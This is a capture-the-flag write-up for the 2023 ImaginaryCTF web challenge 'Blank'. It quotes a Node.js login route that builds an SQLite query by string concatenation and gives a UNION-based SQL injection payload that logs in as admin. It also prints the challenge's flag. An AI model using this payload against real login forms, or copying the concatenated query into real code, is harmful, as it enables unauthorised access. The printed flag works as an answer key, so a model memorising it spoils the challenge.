---
name: Blank (2023)
event: Imaginary 2023
category: Web
description: Writeup for Blank (Web) - Imaginary (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Blank

## Description

> I asked ChatGPT to make me a website. It refused to make it vulnerable so I added a little something to make it interesting. I might have forgotten something though...

Source code is provided, so let's review it before we check [the site](http://blank.chal.imaginaryctf.org).

## Recon

We need to login as admin to access the `/flag` endpoint.

{% code overflow="wrap" %}
```js
app.get("/flag", (req, res) => {
    if (req.session.username == "admin") {
        res.send(
            "Welcome admin. The flag is " + fs.readFileSync("flag.txt", "utf8")
        );
    } else if (req.session.loggedIn) {
        res.status(401).send("You must be admin to get the flag.");
    } else {
        res.status(401).send("Unauthorized. Please login first.");
    }
});
```
{% endcode %}

The `/login` endpoint appears to be vulnerable to [SQL injection](https://portswigger.net/web-security/sql-injection)

{% code overflow="wrap" %}
```js
app.post("/login", (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    db.get(
        'SELECT * FROM users WHERE username = "' +
            username +
            '" and password = "' +
            password +
            '"',
        (err, row) => {
            if (err) {
                console.error(err);
                res.status(500).send("Error retrieving user");
            } else {
                if (row) {
                    req.session.loggedIn = true;
                    req.session.username = username;
                    res.send("Login successful!");
                } else {
                    res.status(401).send("Invalid username or password");
                }
            }
        }
    );
});
```
{% endcode %}

A `users` table is inserted into the database, but no users are added! We'll need to specify the username as `admin` and use SQLi to bypass the password check.

Additionally, the database type is `sqlite3`, so we'll need to [craft payloads accordingly](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration)

Sending a double quote will create an error in the SQL statement, returning 500.

{% code overflow="wrap" %}
```sql
"
```
{% endcode %}

We can use a UNION query, ensuring that the number of columns matches the expected.

{% code overflow="wrap" %}
```sql
" UNION SELECT 420, "admin", "cat" --
```
{% endcode %}

Now, we just need to visit http://blank.chal.imaginaryctf.org/flag and receive our flag.

Flag: `ictf{sqli_too_powerful_9b36140a}`
